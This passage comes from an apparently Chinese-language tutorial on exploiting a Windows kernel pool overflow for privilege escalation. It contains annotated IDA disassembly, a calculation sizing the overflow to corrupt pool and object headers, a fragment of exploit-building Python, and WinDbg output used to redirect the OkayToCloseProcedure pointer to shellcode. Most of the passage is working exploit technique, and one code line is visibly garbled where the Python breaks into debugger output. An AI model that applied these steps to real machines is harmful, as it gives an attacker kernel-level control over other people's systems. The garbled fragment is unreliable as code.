    .text:004196CA                                              ; sub_41998E+78 ...
    .text:004196CA
    .text:004196CA arg_0           = dword ptr  8
    .text:004196CA arg_4           = dword ptr  0Ch
    .text:004196CA
    .text:004196CA                 push    ebp
    .text:004196CB                 mov     ebp, esp
    .text:004196CD                 push    ebx
    .text:004196CE                 mov     ebx, [ebp+arg_4]
    .text:004196D1                 push    edi
    .text:004196D2                 push    3C8h                 ; size_t
    .text:004196D7                 push    0                    ; int
    .text:004196D9                 push    ebx                  ; void *
    .text:004196DA                 call    memset
    .text:004196DF                 mov     edi, [ebp+arg_0]     ; controlled buffer
    .text:004196E2                 xor     edx, edx
    .text:004196E4                 add     esp, 0Ch
    .text:004196E7                 mov     [ebp+arg_4], edx
    .text:004196EA                 mov     eax, [edi]           ; make sure @eax is null
    .text:004196EC                 mov     [ebx], eax           ; the write here is fine
    .text:004196EE                 test    eax, eax
    .text:004196F0                 jz      loc_4197CB           ; take the jump
该代码，会从我们在+0x90的SystemBuffer中得到一个dword值，并将其写入溢出的缓冲区之中，并检查其是否为空。如果为空，我们就不在这个函数中对其继续做处理，并且返回。
    .text:004197CB loc_4197CB:                                  ; CODE XREF: sub_4196CA+26
    .text:004197CB                 pop     edi
    .text:004197CC                 pop     ebx
    .text:004197CD                 pop     ebp
    .text:004197CE                 retn    8
如果不这么做，在试图访问缓冲区中不存在的指针时，很有可能会出现蓝屏。
至此，我们就可以毫无顾虑地触发eop了。关于Shellcode清理，我们溢出的缓冲区存储在@esi中，所以我们可以计算TypeIndex的偏移量，并对其进行修补。最后，建议将ObjectCreateInfo改为空，因为系统会避免使用这个指针。
**打造我们的缓冲区**
****
考虑到在每一次循环时，都会复制0x8字节，并且起始索引是0x1c：
    .text:004199D3                 lea     ecx, [ebx+1Ch]       ; index offset for the first write
假设我们希望得到44字节（0x2c）的缓冲区溢出，我们用缓冲区的大小，减去头部，减去起始索引偏移量，加上想要溢出的字节数，最后将其除以0x8（这是因为每次循环都复制0x8字节）。
    (0x460 – 0x8 – 0x1c + 0x2c) / 0x8 = 0x8d
也就是说，0x8d的大小会使缓冲区溢出0x2c（即44字节），并能损坏池的头部、引用和对象头。
    # repair the allocated chunk header...
        input += struct.pack(" dd nt!ObTypeIndexTable L2
    82b7dee0  00000000 bad0b0b0
请注意，这里的第二个索引是0xbad0b0b0。这样的方法同样可以用于x64系统。
**触发内核中的代码执行**
****
在触发了溢出后，它存活了下来。但为了获得eop，我们需要设置一个指向0x00000074的指针，以利用 **OkayToCloseProcedure**
函数指针。
    kd> dt nt!_OBJECT_TYPE name 84fc8040
       +0x008 Name : _UNICODE_STRING "IoCompletionReserve"
    kd> dt nt!_OBJECT_TYPE 84fc8040 .
       +0x000 TypeList         :  [ 0x84fc8040 - 0x84fc8040 ]
          +0x000 Flink            : 0x84fc8040 _LIST_ENTRY [ 0x84fc8040 - 0x84fc8040 ]
          +0x004 Blink            : 0x84fc8040 _LIST_ENTRY [ 0x84fc8040 - 0x84fc8040 ]
       +0x008 Name             :  "IoCompletionReserve"
          +0x000 Length           : 0x26
          +0x002 MaximumLength    : 0x28
          +0x004 Buffer           : 0x88c01090  "IoCompletionReserve"
       +0x010 DefaultObject    :
       +0x014 Index            : 0x0 ''                